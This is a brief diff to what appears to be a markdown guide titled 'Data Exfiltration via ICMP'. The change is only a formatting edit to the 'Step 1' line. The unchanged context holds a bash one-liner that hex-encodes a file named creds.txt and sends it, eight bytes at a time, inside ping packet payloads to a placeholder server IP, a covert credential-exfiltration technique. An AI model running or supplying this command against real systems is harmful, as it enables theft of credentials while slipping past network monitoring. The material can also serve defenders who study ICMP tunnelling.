@@ -1,6 +1,6 @@
 # Data Exfiltration via ICMP
 
-Step 1 )> Run the following command on the client server from linux command line:
+-Step 1 )> Run the following command on the client server from linux command line:
 ```bash
 xxd -p -c 8 creds.txt | while read h; do ping -c 1 -p $h <Server-IP>; done
 ```
